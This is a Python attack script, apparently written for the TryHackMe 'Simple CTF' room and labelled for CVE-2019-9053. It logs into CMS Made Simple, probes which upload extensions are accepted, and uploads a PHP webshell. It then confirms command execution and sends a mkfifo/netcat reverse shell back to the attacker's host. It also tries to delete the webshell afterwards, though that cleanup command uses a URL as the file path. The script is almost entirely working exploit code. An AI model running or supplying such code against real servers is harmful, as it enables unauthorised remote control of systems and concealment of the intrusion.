#!/usr/bin/env python3
"""
CMS Made Simple - Auto Shell Uploader
CVE-2019-9053 | File Upload Bypass + Reverse Shell
TryHackMe :: Simple CTF

Author: cl4rksec
GitHub: https://github.com/espinalclark/
"""

import requests
import json
import re
import os
import sys
import time
import subprocess
import argparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ===== COLORES =====
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
C = "\033[1;36m"
W = "\033[1;37m"
X = "\033[0m"

BANNER = f"""
{R}
 ▄████▄   ███▄ ▄███▓  ██████      ██████  ██░ ██ ▓█████  ██▓     ██▓
▒██▀ ▀█  ▓██▒▀█▀ ██▒▒██    ▒    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒▓█    ▄ ▓██    ▓██░░ ▓██▄      ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░
▒▓▓▄ ▄██▒▒██    ▒██   ▒   ██▒     ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
▒ ▓███▀ ░▒██▒   ░██▒▒██████▒▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
{C}          [ CMS Made Simple — Auto Shell Uploader ]
{Y}          CVE-2019-9053 | TryHackMe :: Simple CTF{X}
"""

# ===== ARGUMENTOS =====
parser = argparse.ArgumentParser(
    description="CMS Made Simple - Auto Shell Uploader",
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("-t", "--target",   required=True,  help="IP/URL víctima (ej: 10.10.10.10)")
parser.add_argument("-u", "--user",     default="admin", help="Usuario CMS (default: admin)")
parser.add_argument("-p", "--password", required=True,  help="Contraseña CMS")
parser.add_argument("--lhost",          required=True,  help="Tu IP (tun0)")
parser.add_argument("--lport",          default="4444", help="Puerto listener (default: 4444)")
parser.add_argument("--path",           default="/simple", help="Path del CMS (default: /simple)")
args = parser.parse_args()

# ===== CONFIG =====
BASE_URL      = f"http://{args.target}{args.path}"
LOGIN_URL     = f"{BASE_URL}/admin/login.php"
FM_URL        = f"{BASE_URL}/admin/moduleinterface.php"
SHELL_URL_BASE = f"{BASE_URL}/uploads/"
USERNAME      = args.user
PASSWORD      = args.password
LHOST         = args.lhost
LPORT         = args.lport

print(BANNER)
print(f"{C}[*]{X} Target  : {Y}{BASE_URL}{X}")
print(f"{C}[*]{X} Usuario : {Y}{USERNAME}{X}")
print(f"{C}[*]{X} LHOST   : {Y}{LHOST}:{LPORT}{X}\n")

# ===== SESSION CON REINTENTOS =====
s = requests.Session()
retry = Retry(total=3, backoff_factor=1)
s.mount("http://", HTTPAdapter(max_retries=retry))

# ===== LOGIN =====
print(f"{C}[*]{X} Iniciando sesión...")
r = s.post(LOGIN_URL, data={
    "username": USERNAME,
    "password": PASSWORD,
    "loginsubmit": "Submit"
})

# ===== TOKEN __c =====
token = s.cookies.get("__c", "")
if not token:
    r2 = s.get(f"{FM_URL}?mact=FileManager,m1_,defaultadmin,0")
    match = re.search(r'name="__c"\s+value="([^"]+)"', r2.text)
    if not match:
        match = re.search(r'__c=([a-f0-9]+)', r2.url)
    if match:
        token = match.group(1)

if not token:
    print(f"{R}[-]{X} Login fallido — verifica usuario y contraseña")
    sys.exit(1)

print(f"{G}[+]{X} Login exitoso — token: {Y}{token}{X}\n")

# ===== PROBAR EXTENSIONES =====
extensions = [
    "php", "php3", "php4", "php5", "php7", "phtml", "phar",
    "asp", "aspx", "jsp", "py", "pl", "rb", "sh",
    "txt", "html", "htm", "js", "css", "xml", "json",
    "jpg", "png", "gif", "pdf", "zip", "tar", "gz"
]
php_exec = ["phtml", "phar", "php3", "php4", "php5", "php7"]
webshell = b"<?php system($_GET['cmd']); ?>"
accepted = []
shell_uploaded = None

print(f"{C}[*]{X} Probando extensiones...\n")
for ext in extensions:
    files = {"m1_files[]": (f"test.{ext}", b"test", "application/octet-stream")}
    data  = {"mact": "FileManager,m1_,upload,0", "__c": token, "m1_path": "/uploads"}
    r = s.post(FM_URL, files=files, data=data)
    if not r.text.strip():
        print(f"  {Y}[?]{X} {ext:<8} → respuesta vacía")
        continue
    try:
        result = json.loads(r.text)
        if result[0].get("error", ""):
            print(f"  {R}[-]{X} {ext:<8} → bloqueado")
        else:
            print(f"  {G}[+]{X} {ext:<8} → {G}ACEPTADO{X}")
            accepted.append(ext)
    except json.JSONDecodeError:
        print(f"  {Y}[?]{X} {ext:<8} → respuesta no JSON")

# ===== SUBIR WEBSHELL =====
print(f"\n{C}[*]{X} Subiendo webshell...\n")
for ext in php_exec:
    if ext in accepted:
        shell_name = f"shell.{ext}"
        files = {"m1_files[]": (shell_name, webshell, "application/octet-stream")}
        data  = {"mact": "FileManager,m1_,upload,0", "__c": token, "m1_path": "/uploads"}
        r = s.post(FM_URL, files=files, data=data)
        try:
            result = json.loads(r.text)
            if not result[0].get("error", ""):
                shell_url = f"{SHELL_URL_BASE}{shell_name}"
                print(f"  {G}[+]{X} Webshell subida: {Y}{shell_url}{X}")
                shell_uploaded = shell_url
                break
        except json.JSONDecodeError:
            continue

if not shell_uploaded:
    print(f"{R}[-]{X} No se pudo subir webshell")
    sys.exit(1)

# ===== CONFIRMAR RCE =====
print(f"\n{C}[*]{X} Confirmando RCE...")
r = requests.get(shell_uploaded, params={"cmd": "whoami"})
if r.status_code != 200 or not r.text.strip():
    print(f"{R}[-]{X} RCE no confirmado")
    sys.exit(1)

user = r.text.strip()
print(f"  {G}[+]{X} Ejecutando como: {R}{user}{X}")

# ===== TERMINAL SIZE =====
try:
    rows, cols = os.popen('stty size', 'r').read().split()
except:
    rows, cols = "50", "200"

# ===== LISTENER =====
print(f"\n{C}[*]{X} Lanzando listener {Y}{LHOST}:{LPORT}{X}...")

def get_terminal():
    for term in ["kitty", "alacritty", "gnome-terminal", "xterm", "xfce4-terminal"]:
        if subprocess.run(["which", term], capture_output=True).returncode == 0:
            return term
    return None

terminal = get_terminal()
if terminal == "kitty":
    subprocess.Popen(["kitty", "bash", "-c", f"nc -lvnp {LPORT}; exec bash"])
elif terminal == "alacritty":
    subprocess.Popen(["alacritty", "-e", "bash", "-c", f"nc -lvnp {LPORT}; exec bash"])
elif terminal == "xterm":
    subprocess.Popen(["xterm", "-e", f"nc -lvnp {LPORT}"])
else:
    print(f"  {Y}[!]{X} Abre manualmente: {W}nc -lvnp {LPORT}{X}")

time.sleep(2)

# ===== REVERSE SHELL =====
payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
print(f"{C}[*]{X} Enviando payload...")
try:
    requests.get(shell_uploaded, params={"cmd": payload}, timeout=3)
except:
    pass

# ===== LIMPIEZA =====
print(f"{C}[*]{X} Limpiando webshell del servidor...")
try:
    requests.get(shell_uploaded, params={"cmd": f"rm {shell_uploaded}"}, timeout=3)
except:
    pass

print(f"\n{G}[+]{X} Shell enviada. Una vez conectado ejecuta:")
print(f"    {Y}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'{X}")
print(f"    {Y}Ctrl+Z{X}")
print(f"    {Y}stty raw -echo; fg{X}")
print(f"    {Y}export TERM=xterm{X}")
print(f"    {Y}stty rows {rows} cols {cols}{X}\n")
